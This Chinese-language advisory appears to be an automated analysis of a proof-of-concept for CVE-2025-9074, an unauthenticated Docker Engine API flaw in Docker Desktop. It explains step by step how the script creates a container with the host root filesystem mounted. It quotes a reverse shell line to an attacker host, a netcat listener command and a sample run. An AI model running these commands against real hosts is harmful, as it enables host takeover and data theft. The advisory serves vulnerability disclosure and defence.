## CVE-2025-9074 - Docker Desktop (Docker Engine API) LPE (Local Privilege Escalation) / RCE (Remote Code Execution)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** LPE (Local Privilege Escalation) / RCE (Remote Code Execution)

**影响应用:** Docker Desktop (Docker Engine API)

**危害等级:** 高危 (攻击者可通过未认证的Docker Engine API实现宿主机本地权限提升及远程代码执行)

**CVSS评分:** 

**影响版本:** Docker Engine API配置为无需认证访问的版本，通常见于Docker Desktop或Docker daemon的错误配置

**利用条件:** 需要网络访问目标Docker Engine API，且该API端口未启用认证

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-9074 描述了 Docker Desktop 中存在的本地权限提升（LPE）漏洞。此漏洞的根本原因在于 Docker Engine API 在某些配置下无需认证即可进行访问。当 Docker Engine API 暴露在网络中且未启用认证机制时，未经授权的攻击者可以利用此漏洞在宿主机上执行任意命令，从而实现权限提升。攻击者能够通过 API 创建并运行特权容器，将宿主机的根目录挂载到容器内部，并在容器内执行任意恶意代码，最终影响宿主机系统。这种“未认证访问导致的特权操作”是 Docker 环境中常见的严重安全问题，可能导致宿主机完全受控。

**POC有效性分析:** 提供的 POC 代码 `CVE-2025-9074.sh` 是一个功能完整的 Bash 脚本，专门用于利用上述漏洞。脚本的执行流程清晰且高效：
1.  脚本首先使用 `curl` 命令连接到目标 Docker Engine API（默认端口通常为 2375），获取一个现有 Docker 镜像的名称。
2.  接着，它构造一个精心设计的 JSON payload，通过 API 调用 `/containers/create` 创建一个新的 Docker 容器。
3.  这个新容器被配置为运行一个反向 Shell 命令（`bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1`），该命令将尝试连接到攻击者指定的 IP 地址和端口。
4.  最关键的一步是，在容器配置中，`HostConfig` 字段下的 `Binds` 选项将宿主机的根文件系统（对于 Windows 是 `/mnt/host/c`，对于 Linux 是 `/`）挂载到容器内部的特定路径（分别为 `/host_root_win` 或 `/host_root_nix`）。这意味着一旦容器启动，反向 Shell 将在容器内以特权方式运行，并能够访问和操作宿主机的整个文件系统，从而实现本地权限提升。
5.  最后，脚本通过 API 调用 `/containers/${ID}/start` 启动新创建的容器。
整个利用链条逻辑严谨，环环相扣，脚本能够直接演示并实现漏洞利用，因此其有效性非常高。

**利用步骤:**
1.  攻击者需要在其控制的机器上启动一个网络监听器，例如使用 `netcat` 命令：`nc -lvnp [LPORT]` (例如 `nc -lvnp 9002`)，等待反向 Shell 连接。
2.  攻击者需要获取目标 Docker Desktop 宿主机的 IP 地址和未认证的 Docker Engine API 监听端口（通常是 2375）。
3.  在攻击者的机器上执行提供的 Bash 脚本，并提供相应的参数：`sh CVE-2025-9074.sh [目标IP] [目标端口] [攻击者IP] [攻击者监听端口]`。例如：`sh CVE-2025-9074.sh 192.168.65.7 2375 10.10.14.73 9002`。
4.  脚本会自动与目标 Docker Engine API 交互，创建并启动一个恶意的容器。
5.  恶意容器启动后，将尝试连接到攻击者的监听器，建立一个反向 Shell 会话。
6.  攻击者通过建立的反向 Shell 即可在目标宿主机上执行任意命令，由于宿主机的根文件系统已被挂载到容器内，攻击者可以进一步进行权限提升、数据窃取或其他恶意操作。

**投毒风险分析:** 提供的 POC 代码 `CVE-2025-9074.sh` 的投毒风险评估为低（5%）。该脚本代码结构清晰，易于理解，没有进行任何形式的代码混淆或加密处理。脚本仅使用了标准的 `curl` 和 `bash` 命令，这些都是 Linux/Unix 系统中常见的网络请求和 Shell 执行工具，它们的行为是可预测且透明的。脚本唯一的“恶意”行为是构造一个反向 Shell 命令，但这正是该漏洞利用脚本的预期功能和目的。该命令以明文形式直接显示在代码中，任何审查代码的用户都可以清楚地看到其作用。脚本中没有包含任何外部链接，不会下载额外的恶意负载，也没有执行 `eval` 或其他动态代码执行的危险操作。此外，脚本在其使用说明中明确指示用户需要在运行前启动一个反向 Shell 监听器，这进一步表明了其透明性和无害性（指不会在运行者机器上造成额外危害，而仅仅是作为漏洞利用工具）。因此，运行此 POC 不会引入额外的、非预期的安全风险，其行为完全符合其作为漏洞利用脚本的预期功能。

**项目地址:** https://github.com/vulnwatchdog/CVE-2025-9074

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
